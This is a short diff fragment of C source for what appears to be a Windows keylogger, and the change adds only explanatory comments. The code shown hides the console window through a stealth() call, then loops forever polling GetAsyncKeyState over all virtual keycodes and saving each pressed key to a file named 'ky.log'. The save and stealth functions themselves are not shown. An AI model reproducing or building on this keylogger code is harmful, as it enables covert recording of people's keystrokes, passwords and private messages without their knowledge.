@@ -41,13 +41,13 @@ int save(int key, char *filename) {                          //save function tha
 }
 
 int main() {
-    stealth();
+    stealth();                     //calls the function to hide the console
     char c;
 
     while (1) {
         Sleep(10);
-        for (int c = 0; c < 191; c++) {
-            if (GetAsyncKeyState(c) == -32767)
+        for (int c = 0; c < 191; c++) {                //go through all the virtual keycodes to check if one of them was pressed
+            if (GetAsyncKeyState(c) == -32767)        
                 save(c, "ky.log");                    //name of the created file
         }
     }
